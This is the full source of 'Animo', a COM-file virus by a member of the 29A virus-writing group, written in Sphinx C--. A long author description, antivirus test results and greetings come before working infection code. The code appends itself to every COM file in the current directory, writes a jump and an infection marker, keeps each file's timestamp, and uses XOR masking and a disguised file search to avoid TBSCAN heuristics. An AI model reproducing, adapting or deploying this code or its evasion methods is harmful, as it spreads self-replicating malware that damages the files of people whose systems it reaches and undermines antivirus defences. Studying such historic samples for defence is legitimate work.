   /*****( Animo virus description )**********************************************
                                                        ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
   Virus name    : Animo                                ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
   Author        : Rajaat / 29A                          ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
   Origin        : United Kingdom, January 29th         ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
   Compiling     : Using Sphinx C-- (with XFILE pack)   ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
                   C-- ANIMO
                   This is a bit kind of special language, you can download it
                   and the additional XFILE pack (which contains the lseek
                   function) from the official Sphinx C-- site (it is written by
                   Peter Cellik) which is located at
                   http://www.geocities.com/SiliconValley/Vista/3559
   Targets       : COM files (yuck!)
   Infects on    : Runtime, files in the current directory (even more yuck!)
   Size          : 518 bytes (impressive for the language, I love it!)
   Resident      : No
   Polymorphic   : No
   Encrypted     : No
   Stealth       : File date/time, but no critical error handler
   Tunneling     : No
   Retrovirus    : No
   Antiheuristics: Yes, targetted against TBSCAN, which gives zero flags
   Armor         : No
   Payload       : No
   Trigger       : None
   Peculiarities : Written in Sphinx C-- is peculiar, I think, and a good start
                   too. Works only on 80386+ (so?)
   Drawbacks     : I don't know yet, this language happens to be so flexible that
                   you certainly can do a lot more than just COM files, I'm now
                   doing experiments with a multipartite virus already ;-)
   Bugs          : Not that I am aware of...
   Behaviour     : When an infected file is executed the virus will receive
                   control with a near jump to its code located at the
                   start of the file. Then it will get the entry point in
                   SI by calling to the next line (a call is relative) and
                   pop the return address (which is an absolute value) and
                   substract the original located address of get_offset,
                   effectively getting the difference of where the original
                   compiled code is located and the now running code. For
                   some reason unknown to me this doesn't alert TBSCAN,
                   which could spot entrypoints calls with ease and flag
                   like shit. Norman is really fucking up TBSCAN for
                   good... A shame. Well, after it gets the entrypoint it
                   will call to the start_replication() function. That
                   subroutine will first rebuild the first 4 bytes of the
                   infected COM file, so that it can be run again, after
                   the virus is ready doing its work. Then it sets the DTA
                   to the memory location where the virus in memory ends.
                   The next line is some antiheuristic code for TBSCAN, it
                   changes the "*.ZOM" search spec into "*.COM" (TBSCAN
                   would flag on COM so this little change shuts down one
                   flag). Then it will search for COM files with no
                   attributes set in the current directory. If such file is
                   found, it will temporarily store the search spec to
                   "*.ZOM" again. Then it calls the function infect() with
                   a pointer to the filename returned in the DTA as
                   parameter. infect() will open the file in read/write
                   mode and if the open succeeded it will read the first 4
                   bytes of the file into a small buffer. If the 4th byte
                   is an ! it will assume that the file is already infected
                   and will skip it. Then it will check if the opened file
                   has an EXE header. This is done in an antiheuristic
                   fashion. If the file is indeed a COM file, it seek to
                   the end of the file. If the filesize is larger than
                   0x100 bytes (convert them yourself, weenie!) and smaller
                   than 0xF000 (don't you have some calculator?), it will
                   proceed with the infection. It then calculates the
                   relative offset for the JMP instruction that will be
                   placed at the start of the file. Then it will get the
                   file date/time stamp and push it on the stack. After
                   that it will load it's registers with the correct data
                   and writes it's image at the end of the file. Then it
                   jump back to the start of the file and will write the
                   near jump to the virus code and the infection marker
                   (!). When finished, it will restore the file date/time
                   stamp and close the file. The routine to restore the
                   date/time is also done antiheuristically and is so
                   simple that I am amazed that TBSCAN fell for that
                   old-hat trick. After infecting a file, it will search
                   for the next file to infect, until all the files in the
                   current directory are infected. The virus sets the DTA
                   back to the normal address (0x80, which is 0x100 >> 2 or
                   0x100 / 2, whatever you like most, it's half of it). It
                   then pushes its return address (0x100, you already
                   calculated this one) in some antiheuristic (blah) way on
                   the stack, clears the AX register and returns control to
                   the host, which runs like normal (unless it has some
                   self check or when started with some oldsmobile).

                   Sara Ford..... sounds like Science Fiction to me
                   (those Capitals, are they Hidden Pictures or Some
                   Message?)

   Note          : I know that this is a simple COM infector and below
                   standard, but this can be seen as a simple test to check
                   out for myself if C-- is a convenient language and if it
                   was possible to use for some more complex idea I
                   initially had in mind with Borland C++, of which you
                   also can get the source code on the first 2 versions (a
                   direct action appending COM infector and a MCB resident
                   appending COM infector). And yes, I think it is possible
                   to bend C-- to my own twisted desires (oh, I have played
                   Pandemonium 2 a bit too often lately, I fear). Well, the
                   actual story how I came to write a virus in the peculiar
                   language is like this: two days ago I found this program
                   on some homepage (see above) by accident, while using a
                   search engine to help me getting a C front-end for NASM,
                   the Netwide ASseMbler, which is really a great
                   Assembler, which I will try to use in the future
                   L:-o-P-< (Elvis Lives!). Yesterday I started my first
                   experiments in C-- to learn a bit how the language
                   works. Since I know both how to handle C and Assembler
                   (and some others like Pascal, that are not worthwile
                   mentioning here), and now my first virus written in this
                   language lies in front of you! You can see from the
                   source, that it is *VERY* flexible and if properly used,
                   you can build really complex viruses with this, using
                   the easy of C and the power of Assembler (btw, have you
                   noticed that I write the word Assembler with a Capital
                   A? Would this have a hidden meaning? Some Complex Code?
                   A Secret Message? No, it's just my Language Worshipping
                   Mood again &-! By the way, the virus compiles very
                   small, it's a very good compiler, and although writing
                   in assembler still creates much tighter code, I think
                   this language is worth a try. You can shorten code much
                   by using register functions (try getting most of the
                   return codes into the AX register, so you don't need the
                   return code, which takes one extra "ret" code, even when
                   returning with a fixed value).

                   I hereby would like to show my gratitude to Peter Cellik
                   for writing such a wonderful language, although I would
                   like to see some things added, like:

                   o       structures
                   o       unions
                   o       functions that generate no code at all (not even
                           the IRET)
                   o       the possibility to do some AND operation in
                           if statements, like:

                           if ((filesize > 0x100) && (filesize < 0xf000))

                           instead of this crummy way (although they
                           probably would generate the same thing, but I
                           think the above one is preferred and look more
                           clean to me):

                           if (filesize > 0x100)
                             if (filesize < 0xf000)

                   o       doing some more complex calculations, which now
                           have to be broken up in parts, like:

                           cx = (cyl << 8 | sector) | (cyl & 0x300 >> 2);
                           CX = cx;

                           or even better:
                           CX = (cyl << 8 | sector) | (cyl & 0x300 >> 2);

                           instead of having to do manipulations like this,
                           which look not very readable to me:

                           cx = cyl << 8 | sector;
                           cx |= cyl & 0x300 >> 2;
                           CX = cx;

                           Or another example:

                           word virus_sectors()
                           {
                             AX = virus_bytes() / 512 + 1;
                           }

                           instead of:

                           word virus_sectors()
                           {
                             AX = virus_bytes() / 512;
                             AX++;
                           }

                   Anyway, as a little token of my gratitude to Peter
                   Cellik, I will post a litte part of his documentation in
                   here:

                    "3.4  ABUSES

                     Anyone with a mischievous mind (most people do) can
                     think of some not so nice ways of using this function.
                     The most obvious of which would be the creation of
                     trojan horses.  I WOULD LIKE TO POINT OUT THAT THIS IS
                     NOT A CONSTRUCTIVE USE OF C-- AND ANY DESTRUCTIVE USE
                     OF COM FILE SYMBIOSIS IS PROHIBITED.  In other words,
                     don't be a jerk. "

                   Well, I think I am no jerk, since I don't have to use
                   that "feature" :-). Anybody who wants to write viruses
                   in this language are also kindly asked to support Peter
                   Celliks idea of GREENWARE. To cite:

                    "THE PRICE:
                     ~~~~~~~~~~
                     This version of C-- is GREENWARE, and you are free to
                     use it so long as you make an effort everyday to help
                     out the environment.  A few ideas:

                     - use only recycled computer paper
                     - be sure to recycle the computer paper after you use it
                     - use public transport
                     - sell that 80 cylinder car of yours and buy a small 4
                       cylinder, or better yet, buy a motorbike
                     - support Green Peace
                     - REDUCE-REUSE-recycle
                     - stop smoking
                     - ride a bike to work or school
                     - don't buy products that are harmful to the environment
                     - stop using weed killers on your lawn
                     - support Friends of the Earth
                     - recycle your cans
                     - don't buy products that have lots of extra packaging
                     - use a fax modem instead of a paper fax machine
                     - reuse your plastic bags
                     - (you get the idea) "

                   Well, I think he has some great ideas there, in the
                   progress of writing viruses, I waste tons of paper, I
                   don't have a lawn, so I don't need weed killer anyway,
                   all my trash gets recycled already, I have access to a
                   HP Officejet LX, and I don't use plastic bags cut a more
                   robust one. But one can go too far, Peter. I won't quit
                   smoking, you never can convince me not going to Spain
                   with Darkman by car (although I am scared by thinking of
                   abandoning the "left hand path", and sure as hell I would
                   not support a group of terrorists that plum a seal for a
                   picture to shock people. I do not believe in the "can't
                   make an omelette without breaking a few eggs" attitude.
                   Fuck Green Peace! Though trying to stop French nuking
                   is ok :-).

                   Well, the comments are longer than the source, what else
                   can I say, enjoy! By the way, those pieces of example
                   codes of my wishlist above are code snippets for my next
                   virus in C--.

                   Rajaat / 29A
                   rajaat@itookmyprozac.com
                   http://www.geocities.com/SiliconValley/Vista/7227
                   (I know, it's outdated, I hope to update it soon, a new
                   page is in the making)

                   Don't forget to take a look at these sites:

                       http://www.geocities.com/SiliconValley/Vista/3559
                       http://www.cryogen.com/Nasm
                       http://www.x86.org

   *****( Results with antivirus software )***************************************

           TBSCAN                    - Doesn't detect it
           F-PROT                    - Doesn't detect it (yet)
           F-PROT /ANALYSE           - Detects it
           F-PROT /ANALYSE /PARANOID - Detects it (wow, genius)

   *****( Greetings )*************************************************************

   I hereby would like to take the opportunity to greet a few people:

           - the rest of the 29A people (it is great to work with you people)
           - the unforgiven and metal militia (heroes in the snow!)
           - z0mbie (ShadowRAM Technology rocks!)
           - [sm] (RT got quite some attention I heard!)
           - owl[fs] (still breeding some ideas?)
           - retch (MP3 CD? ;-)
           - bds (hiya!)
           - antigen and priest (when will I hear from you guys again?)
           - rhincewind (someday I'll be able to contact you again... I hope)
           - trigger (don't SLAM that door so hard, will ya?)
           - spicy impregnator (no taste)
           - qark & quantum (get back to work)
           - metabolis (I miss your remarks)
           - raid (ASIC is fun, but not my idea of ideal virus language, you
                   won't get much farther than a direct action generic prepending
                   infector)

   If anybody feels left out who deserves to get greeted by me can paste
   their name between to two lines for *FREE* inclusion:

   ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   hahahahahahahahahahahahahaha die trying!

   *****( Start of the virus code )**********************************************/

   ? resize FALSE                  // No memory resizing
   ? jumptomain NONE               // No jumps to main procedure
   ? codesize                      // Optimize code for size
   ? alignword FALSE               // Align word on even offset set to off

   ? include "dos.h--"             // Use DOS functions
   ? include "xfile.h--"           // And now new extended functions (LSEEK)

   byte virus_end;                 // Last Data Item

   byte nops[4] = { 0x90, 0x90, 0x90, 0x90 };     // Fake host

   word main()                     // Virus entry point
   {
     $ CALL get_delta              //
     get_delta:                    // Get delta offset in SI
     $ POP SI                      //
     SI -= #get_delta;             //
     start_replication();          // Call replicator
     AX = 0x100 ^ 0x6510;          // Push entrypoint
     AX ^= 0x6510;                 // with some antiheuristics
     $ PUSH AX;                    // on the stack and
     AX = 0;                       // clear AX
   }

   byte host_bytes[4] = { 0xCD, 0x20, 0, 0  };     // Host data
   byte searchspec = "*.ZOM";      // Searchspec
   byte jumpop = 0xE9;             // Near jump
   word nearjmp = 0;               // The offset
   byte marker = '!';              // and infection marker

   byte virus  = "[Animo]";        // Spliffbanger!
   byte author = "[Rajaat/29A]";   // some personal stuff

   start_replication()
   {
     $ PUSH SI                     // Preserve delta
     SI = #host_bytes[SI];         // Point to host bytes
     DI = #nops;                   // Absolute nops is at 0x100
     $ CLD                         // Clear direction
     $ MOVSW                       // Move the 4 bytes we have save to the
     $ MOVSW                       // start of the host
     $ POP SI                      // Get delta back from stack
     setDTA(CS,#virus_end[SI]);    // Set DTA to behind virus image
     searchspec[SI+2] = 'C';       // Antiheuristics again
     if (FINDFIRSTFILE(,,0,#searchspec[SI]) == 0)
     {
       do                          // We found a COM file
       {
         searchspec[SI+2] = 'Z';   // Again some antiheuristic action
         infect(#virus_end[SI+0x1e]); // And call the infection routine
         searchspec[SI+2] = 'C';   // And back to normal for COM searching
         FINDNEXTFILE();           // And find next function
       } while (AX == 0);          // Hopefully
     }
     setDTA(CS,0x80);              // Restore DTA
   }

   infect(word filename)           // Infection procedure
   word handle;                    // Temporary file handle placement
   word bytes_read;                // Amount of bytes read
   word myoffset;                  // My own offset (need multiple steps)
   word twobytes;
   long filesize;                  // And the filesize
   {
     handle = FOPEN(2,,,filename); // Open file with write access
     if (handle != 0)              // If no error
     {
       FREAD( , handle, 4, #host_bytes[SI]);            // Read 4 bytes
       if (host_bytes[SI+3] != '!')                     // Already infected
       {                                                // No, we continue
         twobytes = host_bytes[0];                      // get 1st word
         twobytes += host_bytes[1] << 8;                // stupid way
         twobytes ^= 0x029A;                            // Final antiheuristics
         if (twobytes != 0x4d5a ^ 0x029A)               // Check exe
         if (twobytes != 0x5a4d ^ 0x029A)               // weird exe
         twobytes ^= 0x029A;                            // Decrypt again ;-)
         filesize = lseek(handle, long 0, SEEK_END);    // Get filesize
         if (filesize > 0x100)                          // Not too small?
           if (filesize < 0xf000)                       // Not too big?
           {                                            // Right size!
             nearjmp[SI] = filesize - 3;                // Get relative EP
             AX = 0x5700;                               // Store file date and
             $ INT 0x21;                                // time on the
             $ PUSH CX;                                 // stack for later
             $ PUSH DX;                                 // retrieval
             bytes_read = get_virus_size();             // virus size
             myoffset = #main + SI;                     // relative virus start
             FWRITE(, handle, bytes_read, myoffset);    // write virus
             lseek(handle, long 0, SEEK_SET);           // go start of file
             FWRITE(, handle, 4, #jumpop[SI]);          // write jump
             $ POP DX;                                  // Restore date and
             $ POP CX;                                  // time of the file
             AX = 0x5701 ^ 0x8086;                      // and put them back
             AX ^= 0x8086;                              // on it with some
             $ INT 0x21;                                // antiheuristics
           }
       }
       FCLOSE(,handle);            // Close file (we're done)
     }
   }

   word get_virus_size()           // Gets address of latest memory byte of
   {                               // virus, effectively getting the virus
     AX = #virus_end-#main;        // size
   }

   /*****( This is the end, my dear friend )*************************************/
